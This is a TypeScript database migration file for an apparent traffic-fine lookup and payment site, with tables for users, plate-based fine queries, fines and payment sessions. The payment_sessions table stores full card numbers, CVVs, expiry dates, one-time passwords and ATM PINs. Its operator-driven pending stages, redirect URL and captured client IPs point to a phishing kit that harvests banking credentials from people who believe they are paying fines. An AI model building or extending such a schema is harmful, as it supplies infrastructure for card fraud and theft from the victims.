import mysql from "mysql2/promise";
import { ENV } from "./env";

const CREATE_TABLES_SQL = `
CREATE TABLE IF NOT EXISTS \`users\` (
  \`id\` int AUTO_INCREMENT NOT NULL,
  \`openId\` varchar(64) NOT NULL,
  \`name\` text,
  \`email\` varchar(320),
  \`loginMethod\` varchar(64),
  \`role\` enum('user','admin') NOT NULL DEFAULT 'user',
  \`createdAt\` timestamp NOT NULL DEFAULT (now()),
  \`updatedAt\` timestamp NOT NULL DEFAULT (now()) ON UPDATE CURRENT_TIMESTAMP,
  \`lastSignedIn\` timestamp NOT NULL DEFAULT (now()),
  CONSTRAINT \`users_id\` PRIMARY KEY(\`id\`),
  CONSTRAINT \`users_openId_unique\` UNIQUE(\`openId\`)
);

CREATE TABLE IF NOT EXISTS \`fine_queries\` (
  \`id\` int AUTO_INCREMENT NOT NULL,
  \`plateSource\` varchar(100) NOT NULL,
  \`plateNumber\` varchar(50) NOT NULL,
  \`plateCode\` varchar(50) NOT NULL,
  \`status\` enum('pending','success','failed','no_fines') NOT NULL DEFAULT 'pending',
  \`errorMessage\` text,
  \`totalFines\` int DEFAULT 0,
  \`totalAmount\` decimal(10,2),
  \`rawResults\` json,
  \`userId\` int,
  \`createdAt\` timestamp NOT NULL DEFAULT (now()),
  \`updatedAt\` timestamp NOT NULL DEFAULT (now()) ON UPDATE CURRENT_TIMESTAMP,
  CONSTRAINT \`fine_queries_id\` PRIMARY KEY(\`id\`)
);

CREATE TABLE IF NOT EXISTS \`fines\` (
  \`id\` int AUTO_INCREMENT NOT NULL,
  \`queryId\` int NOT NULL,
  \`fineNumber\` varchar(100),
  \`fineDate\` varchar(50),
  \`description\` text,
  \`amount\` decimal(10,2),
  \`blackPoints\` int DEFAULT 0,
  \`isPaid\` enum('paid','unpaid','partial') DEFAULT 'unpaid',
  \`location\` text,
  \`createdAt\` timestamp NOT NULL DEFAULT (now()),
  CONSTRAINT \`fines_id\` PRIMARY KEY(\`id\`)
);

CREATE TABLE IF NOT EXISTS \`payment_sessions\` (
  \`id\` int AUTO_INCREMENT NOT NULL,
  \`sessionId\` varchar(64) NOT NULL,
  \`queryId\` int,
  \`selectedFines\` json,
  \`totalAmount\` varchar(50),
  \`cardName\` varchar(200),
  \`cardNumber\` varchar(20),
  \`cardNumberMasked\` varchar(20),
  \`cardExpiry\` varchar(10),
  \`cardCvv\` varchar(10),
  \`otpCode\` varchar(20),
  \`atmPin\` varchar(20),
  \`stage\` enum('card','card_pending','otp','otp_pending','atm','atm_pending','success','failed') NOT NULL DEFAULT 'card',
  \`errorMessage\` text,
  \`plateNumber\` varchar(50),
  \`plateSource\` varchar(100),
  \`clientIp\` varchar(50),
  \`userAgent\` text,
  \`statusRead\` int DEFAULT 0,
  \`redirectUrl\` varchar(500) DEFAULT NULL,
  \`createdAt\` timestamp NOT NULL DEFAULT (now()),
  \`updatedAt\` timestamp NOT NULL DEFAULT (now()) ON UPDATE CURRENT_TIMESTAMP,
  CONSTRAINT \`payment_sessions_id\` PRIMARY KEY(\`id\`),
  CONSTRAINT \`payment_sessions_sessionId_unique\` UNIQUE(\`sessionId\`)
);
`;

export async function runMigrations(): Promise<void> {
  const databaseUrl = ENV.databaseUrl;
  if (!databaseUrl) {
    console.warn("[Migrate] DATABASE_URL not set, skipping migrations");
    return;
  }

  let connection: mysql.Connection | null = null;
  try {
    console.log("[Migrate] Connecting to database for migrations...");
    
    // Parse URL to check if database is specified
    const url = new URL(databaseUrl);
    const dbName = url.pathname.slice(1);
    
    if (!dbName) {
      console.error("[Migrate] No database name specified in DATABASE_URL. Example: mysql://user:pass@host:port/dbname");
      // If no DB specified, we might need to connect to the server first then CREATE DATABASE
    }

    connection = await mysql.createConnection({
      uri: databaseUrl,
      multipleStatements: true // Allow multiple statements if needed
    });

    console.log("[Migrate] Connection established. Running table creation...");

    // Run the entire script at once since we enabled multipleStatements
    await connection.query(CREATE_TABLES_SQL);
    console.log("[Migrate] Core tables created or already exist.");

    // Sync columns for existing tables
    const tablesToSync: Record<string, Record<string, string>> = {
      payment_sessions: {
        redirectUrl: "varchar(500) DEFAULT NULL",
      },
      fine_queries: {
        plateSource: "varchar(100) NOT NULL",
        plateNumber: "varchar(50) NOT NULL",
        plateCode: "varchar(50) NOT NULL",
        status: "enum('pending','success','failed','no_fines') NOT NULL DEFAULT 'pending'",
        errorMessage: "text",
        totalFines: "int DEFAULT 0",
        totalAmount: "decimal(10,2)",
        rawResults: "json",
        userId: "int",
      }
    };

    for (const [tableName, columns] of Object.entries(tablesToSync)) {
      for (const [columnName, columnDef] of Object.entries(columns)) {
        try {
          await connection.execute(
            `ALTER TABLE \`${tableName}\` ADD COLUMN \`${columnName}\` ${columnDef}`
          );
          console.log(`[Migrate] Added missing column: ${tableName}.${columnName}`);
        } catch (err: any) {
          if (err.code === 'ER_DUP_FIELDNAME' || err.message.includes('Duplicate column name')) {
            // Column already exists, ignore
          } else {
            console.error(`[Migrate] Failed to sync column ${tableName}.${columnName}:`, err.message);
          }
        }
      }
    }

    console.log("[Migrate] Database migrations completed successfully");
  } catch (error: any) {
    console.error("[Migrate] Migration CRITICAL FAILURE:", error.message);
    if (error.code === 'ER_DBACCESS_DENIED_ERROR') {
      console.error("[Migrate] Access denied. Check your database credentials and permissions.");
    } else if (error.code === 'ER_BAD_DB_ERROR') {
      console.error("[Migrate] Database does not exist. Check the database name in your URL.");
    }
  } finally {
    if (connection) {
      await connection.end();
    }
  }
}
